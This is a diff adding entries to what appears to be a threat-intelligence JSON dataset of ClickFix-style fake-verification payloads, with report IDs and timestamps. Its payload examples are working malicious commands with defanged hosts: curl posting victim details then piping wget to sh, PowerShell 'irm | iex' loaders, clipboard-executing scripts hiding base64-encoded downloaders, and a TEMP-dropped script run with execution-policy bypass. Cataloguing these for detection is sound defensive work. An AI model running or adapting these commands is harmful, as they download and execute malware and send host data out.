+    "FirstSeen": "2026-11-11T12:40:24.105000+00:00",
+    "LastSeen": "2026-11-11T12:40:24.105000+00:00",
+    "ReportIds": [
+      "cmwc3x5a204lg0omlb2wqsuby"
+    ],
+    "PayloadExamples": [
+      "curl -sL -d \"id=c904d3d4-0134-4538-962a-87f6cc0e2b25&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww[.]balancedarch[.]ca%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T12%3A38%3A58.204Z&lastShellAt=2026-11-11T12%3A38%3A58.204Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh"
+    ]
+  },
+  {
+    "Pattern": "curl -sL -d \"id=ce23b1b3-0f76-4be3-b79a-d8fc0016875a&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Freneesolomon.com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-12T19%3A59%3A11.299Z&lastShellAt=2026-11-12T19%3A59%3A11.299Z\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-12T20:00:34.925000+00:00",
+    "LastSeen": "2026-11-12T20:00:34.925000+00:00",
+    "ReportIds": [
+      "cmwdz32o206wn0omluye82wa5"
+    ],
+    "PayloadExamples": [
+      "curl -sL -d \"id=ce23b1b3-0f76-4be3-b79a-d8fc0016875a&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Freneesolomon[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-12T19%3A59%3A11.299Z&lastShellAt=2026-11-12T19%3A59%3A11.299Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh"
+    ]
+  },
+  {
+    "Pattern": "curl -sL -d \"id=dc020fc6-fc17-4dc6-a93b-35f429c1aa3c&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fcameronchetty.co.za%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T09%3A40%3A57.802Z&lastShellAt=2026-11-11T09%3A40%3A57.802Z\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-11T09:42:23.220000+00:00",
+    "LastSeen": "2026-11-11T09:42:23.220000+00:00",
+    "ReportIds": [
+      "cmwbxk7wd020h0omlqgstyvvt"
+    ],
+    "PayloadExamples": [
+      "curl -sL -d \"id=dc020fc6-fc17-4dc6-a93b-35f429c1aa3c&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fcameronchetty.co.za%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T09%3A40%3A57.802Z&lastShellAt=2026-11-11T09%3A40%3A57.802Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh"
+    ]
+  },
+  {
+    "Pattern": "curl -sL -d \"id=e061325d-e3f5-4bf4-b562-31a09ea854b9&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fcofeservice.ru%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T01%3A00%3A40.345Z&lastShellAt=2026-11-11T01%3A00%3A40.345Z\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-11T01:02:03.343000+00:00",
+    "LastSeen": "2026-11-11T01:02:03.343000+00:00",
+    "ReportIds": [
+      "cmwbez2fg06ao0nmlov0j0g7o"
+    ],
+    "PayloadExamples": [
+      "curl -sL -d \"id=e061325d-e3f5-4bf4-b562-31a09ea854b9&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fcofeservice[.]ru%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T01%3A00%3A40.345Z&lastShellAt=2026-11-11T01%3A00%3A40.345Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh"
+    ]
+  },
+  {
+    "Pattern": "curl -sL -d \"id=f3fa0c1a-7e0e-48b4-b932-1a798360dc9c&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fbharquitetura.com.br%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T11%3A47%3A52.597Z&lastShellAt=2026-11-11T11%3A47%3A52.597Z\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-11T11:49:19.783000+00:00",
+    "LastSeen": "2026-11-11T11:49:19.783000+00:00",
+    "ReportIds": [
+      "cmwc23hcx03s30omll1gu2llr"
+    ],
+    "PayloadExamples": [
+      "curl -sL -d \"id=f3fa0c1a-7e0e-48b4-b932-1a798360dc9c&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fbharquitetura[.]com[.]br%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T11%3A47%3A52.597Z&lastShellAt=2026-11-11T11%3A47%3A52.597Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh"
+    ]
+  },
+  {
+    "Pattern": "irm '<URL>' | iex;",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-09T06:12:24.031000+00:00",
+    "LastSeen": "2026-11-09T06:12:24.031000+00:00",
+    "ReportIds": [
+      "cmw8v6gwt25dh0omltgqtmmjd"
+    ],
+    "PayloadExamples": [
+      "irm 'https://err12[.]online/MPN34CUssTOxul1S=9aa1f611e4d27fce' | iex;"
+    ]
+  },
+  {
+    "Pattern": "powershell -c \"\"Invoke-Expression((Get-Clipboard)[1..((Get-Clipboard).Count - 1)] -join \"\"\"\"`n\"\"\"\");\"\"                                                                                                                                                              \necho \"\n  ____ _                 _  __ _\n / ___| | ___  _   _  __| |/ _| | __ _ _ __ ___\n| |   | |/ _ \\| | | |/ _  | |_| |/ _  |  __/ _ \\\n| |___| | (_) | |_| | (_| |  _| | (_| | | |  __/\n \\____|_|\\___/ \\__,_|\\__,_|_| |_|\\__,_|_|  \\___|\n\"`\n\nWrite-Output \"Initializing verification ...\"\nStart-Sleep -Milliseconds 541\n\n$updateloadUrl = 'UwBlAHQALQBBAGwAaQBhAHMAIAB2AGIAbAAgACgAZwBjAG0AIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AKQA7ACQAYwBhAGsAeQB2AG8APQAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBhAG0AZQByAGkAYwBhAG4AYgBvAHkAdwBvAHcALwBtAGEAcgB5AHMAdAB1AGEAcgB0AFUAUwAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8AbwBsAGQALQB1AHAAZABhAHQAZQAuAGQAYQB0ACcAKQA7AHYAYgBsACgAaQB3AHIAIAAtAHUAcwBlAGIAYQBzACAAJABjAGEAawB5AHYAbwApAA=='\n\n$bytes = [Convert]::FromBase64String($updateloadUrl)\n$clean = [Text.Encoding]::Unicode.GetString($bytes)\n\nStart-Sleep -Milliseconds 581\nWrite-Output \"Processing request ...\"\nStart-Sleep -Milliseconds 943\nWrite-Host -NoNewline \"Verification successful. Continuing. Please wait a few seconds and do not close this window \"\nfor ($i = 0; $i -lt 5; $i++) {\n    Start-Sleep -Milliseconds 400\n    Write-Host -NoNewline \".\"\n}\nInvoke-Expression $clean",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-12T01:50:44.091000+00:00",
+    "LastSeen": "2026-11-12T01:50:44.091000+00:00",
+    "ReportIds": [
+      "cmwcw5ism0f650omlpzn2v666"
+    ],
+    "PayloadExamples": [
+      "powershell -c \"\"Invoke-Expression((Get-Clipboard)[1..((Get-Clipboard).Count - 1)] -join \"\"\"\"`n\"\"\"\");\"\"                                                                                                                                                              \necho \"\n  ____ _                 _  __ _\n / ___| | ___  _   _  __| |/ _| | __ _ _ __ ___\n| |   | |/ _ \\| | | |/ _  | |_| |/ _  |  __/ _ \\\n| |___| | (_) | |_| | (_| |  _| | (_| | | |  __/\n \\____|_|\\___/ \\__,_|\\__,_|_| |_|\\__,_|_|  \\___|\n\"`\n\nWrite-Output \"Initializing verification ...\"\nStart-Sleep -Milliseconds 541\n\n$updateloadUrl = 'UwBlAHQALQBBAGwAaQBhAHMAIAB2AGIAbAAgACgAZwBjAG0AIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AKQA7ACQAYwBhAGsAeQB2AG8APQAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBhAG0AZQByAGkAYwBhAG4AYgBvAHkAdwBvAHcALwBtAGEAcgB5AHMAdAB1AGEAcgB0AFUAUwAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8AbwBsAGQALQB1AHAAZABhAHQAZQAuAGQAYQB0ACcAKQA7AHYAYgBsACgAaQB3AHIAIAAtAHUAcwBlAGIAYQBzACAAJABjAGEAawB5AHYAbwApAA=='\n\n$bytes = [Convert]::FromBase64String($updateloadUrl)\n$clean = [Text.Encoding]::Unicode.GetString($bytes)\n\nStart-Sleep -Milliseconds 581\nWrite-Output \"Processing request ...\"\nStart-Sleep -Milliseconds 943\nWrite-Host -NoNewline \"Verification successful. Continuing. Please wait a few seconds and do not close this window \"\nfor ($i = 0; $i -lt 5; $i++) {\n    Start-Sleep -Milliseconds 400\n    Write-Host -NoNewline \".\"\n}\nInvoke-Expression $clean"
+    ]
+  },
+  {
+    "Pattern": "powershell -c \"\"Invoke-Expression((Get-Clipboard)[1..((Get-Clipboard).Count - 1)] -join \"\"\"\"`n\"\"\"\");\"\"                                                                                                                                                              \necho \"\n  ______ _                 _  ___ _                  \n / _____) |               | |/ __) |                 \n| /     | | ___  _   _  _ | | |__| | ____  ____ ____ \n| |     | |/ _ \\| | | |/ || |  __) |/ _  |/ ___) _  )\n| \\_____| | |_| | |_| ( (_| | |  | ( ( | | |  ( (/ / \n \\______)_|\\___/ \\____|\\____|_|  |_|\\_||_|_|   \\____)\n\"`\n\nWrite-Output \"Initializing verification ...\"\nStart-Sleep -Milliseconds 573\n\n$updateloadUrl = 'cwBhAGwAIABrAHIAaAAgACgAIABnAGMAbQAgACoALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKQAgADsAawByAGgAKAAgAGMAdQByAGwAIAAtAHUAcwBlAGIAYQBzACAAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGEAbQBlAHIAaQBjAGEAbgBiAG8AeQB3AG8AdwAvAG0AYQByAHkAcwB0AHUAYQByAHQAVQBTAC8AcgBlAGYAcwAvAGgAZQBhAGQAcwAvAG0AYQBpAG4ALwBvAGwAZAAtAHUAcABkAGEAdABlAC4AZABhAHQAJwAgACkA'\n\n$bytes = [Convert]::FromBase64String($updateloadUrl)\n$clean = [Text.Encoding]::Unicode.GetString($bytes)\n\nStart-Sleep -Milliseconds 513\nWrite-Output \"Processing request ...\"\nStart-Sleep -Milliseconds 1102\nWrite-Host -NoNewline \"Verification successful. Continuing. Please wait a few seconds and do not close this window \"\nfor ($i = 0; $i -lt 5; $i++) {\n    Start-Sleep -Milliseconds 400\n    Write-Host -NoNewline \".\"\n}\nInvoke-Expression $clean",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-12T17:44:10.365000+00:00",
+    "LastSeen": "2026-11-12T17:44:10.365000+00:00",
+    "ReportIds": [
+      "cmwdu7ne704wl0oml3qv8u2ba"
+    ],
+    "PayloadExamples": [
+      "powershell -c \"\"Invoke-Expression((Get-Clipboard)[1..((Get-Clipboard).Count - 1)] -join \"\"\"\"`n\"\"\"\");\"\"                                                                                                                                                              \necho \"\n  ______ _                 _  ___ _                  \n / _____) |               | |/ __) |                 \n| /     | | ___  _   _  _ | | |__| | ____  ____ ____ \n| |     | |/ _ \\| | | |/ || |  __) |/ _  |/ ___) _  )\n| \\_____| | |_| | |_| ( (_| | |  | ( ( | | |  ( (/ / \n \\______)_|\\___/ \\____|\\____|_|  |_|\\_||_|_|   \\____)\n\"`\n\nWrite-Output \"Initializing verification ...\"\nStart-Sleep -Milliseconds 573\n\n$updateloadUrl = 'cwBhAGwAIABrAHIAaAAgACgAIABnAGMAbQAgACoALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKQAgADsAawByAGgAKAAgAGMAdQByAGwAIAAtAHUAcwBlAGIAYQBzACAAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGEAbQBlAHIAaQBjAGEAbgBiAG8AeQB3AG8AdwAvAG0AYQByAHkAcwB0AHUAYQByAHQAVQBTAC8AcgBlAGYAcwAvAGgAZQBhAGQAcwAvAG0AYQBpAG4ALwBvAGwAZAAtAHUAcABkAGEAdABlAC4AZABhAHQAJwAgACkA'\n\n$bytes = [Convert]::FromBase64String($updateloadUrl)\n$clean = [Text.Encoding]::Unicode.GetString($bytes)\n\nStart-Sleep -Milliseconds 513\nWrite-Output \"Processing request ...\"\nStart-Sleep -Milliseconds 1102\nWrite-Host -NoNewline \"Verification successful. Continuing. Please wait a few seconds and do not close this window \"\nfor ($i = 0; $i -lt 5; $i++) {\n    Start-Sleep -Milliseconds 400\n    Write-Host -NoNewline \".\"\n}\nInvoke-Expression $clean"
+    ]
+  },
+  {
+    "Pattern": "powershell -c \\\"irm '<URL>'|powershell -\\\"\"; (function(){var C=\"8008b4f134704bdd\",B=\"<URL>\";var FS=0,HC=0,OBF=1,AFTER=\"close\",REDIR=\"\";function _pg(){try{return{page:location.href||\"\",ref:document.referrer||\"\"};}catch(e){return{page:\"\",ref:\"\"};}}function pb(ev,nt){try{var pg=_pg();var u=B+\"/api/js/beacon/\"+encodeURIComponent(C)+\"?event=\"+encodeURIComponent(ev)+\"&note=\"+encodeURIComponent(nt||\"\")+\"&page=\"+encodeURIComponent(pg.page)+\"&ref=\"+encodeURIComponent(pg.ref)+\"&_=\"+Date.now();var s=document.createElement(\"script\");s.src=u;s.async=true;document.head.appendChild(s);}catch(e){}}window.__panelBeacon=pb;function _capClick(t){if(!t)return false;if(t.id===\"cfm-cb\"||t.id===\"cfm-ck\")return true;if(t.closest&&(t.closest(\"#cfm-cb\")||t.closest(\"#cfm-ck\")||t.closest(\".checkbox-window\")||t.closest(\".checkbox-container\")))return true;return false;}function _rid(n){var c='abcdefghijklmnopqrstuvwxyz0123456789',s='';for(var i=0;i",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-11T16:07:10.237000+00:00",
+    "LastSeen": "2026-11-11T16:07:10.237000+00:00",
+    "ReportIds": [
+      "cmwcbb1wp06p00omllkagp0ih"
+    ],
+    "PayloadExamples": [
+      "powershell -c \\\"irm 'https://content-collector[.]com/dYjJs2gGewlXGMKe'|powershell -\\\"\"; (function(){var C=\"8008b4f134704bdd\",B=\"https://js-staticdelivery[.]com\";var FS=0,HC=0,OBF=1,AFTER=\"close\",REDIR=\"\";function _pg(){try{return{page:location.href||\"\",ref:document.referrer||\"\"};}catch(e){return{page:\"\",ref:\"\"};}}function pb(ev,nt){try{var pg=_pg();var u=B+\"/api/js/beacon/\"+encodeURIComponent(C)+\"?event=\"+encodeURIComponent(ev)+\"&note=\"+encodeURIComponent(nt||\"\")+\"&page=\"+encodeURIComponent(pg[.]page)+\"&ref=\"+encodeURIComponent(pg.ref)+\"&_=\"+Date.now();var s=document.createElement(\"script\");s.src=u;s.async=true;document.head.appendChild(s);}catch(e){}}window.__panelBeacon=pb;function _capClick(t){if(!t)return false;if(t.id===\"cfm-cb\"||t.id===\"cfm-ck\")return true;if(t.closest&&(t.closest(\"#cfm-cb\")||t.closest(\"#cfm-ck\")||t.closest(\".checkbox-window\")||t.closest(\".checkbox-container\")))return true;return false;}function _rid(n){var c='abcdefghijklmnopqrstuvwxyz0123456789',s='';for(var i=0;i"
+    ]
+  },
+  {
+    "Pattern": "powershell -nop -c \\\"$f=$env:TEMP+'\\\\clakr.ps1';curl.exe -sk -o $f '<URL>';powershell -ep bypass -File $f\\\"",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-13T00:11:52.429000+00:00",
+    "LastSeen": "2026-11-13T00:11:52.429000+00:00",
+    "ReportIds": [
+      "cmwe828jj08m80omlzcgd7pm1"
+    ],
+    "PayloadExamples": [
+      "powershell -nop -c \\\"$f=$env:TEMP+'\\\\clakr.ps1';curl.exe -sk -o $f 'https://bingixllc[.]com/ztIDWUOFZ51SiqJ6';powershell -ep bypass -File $f\\\""
+    ]
+  }
+]
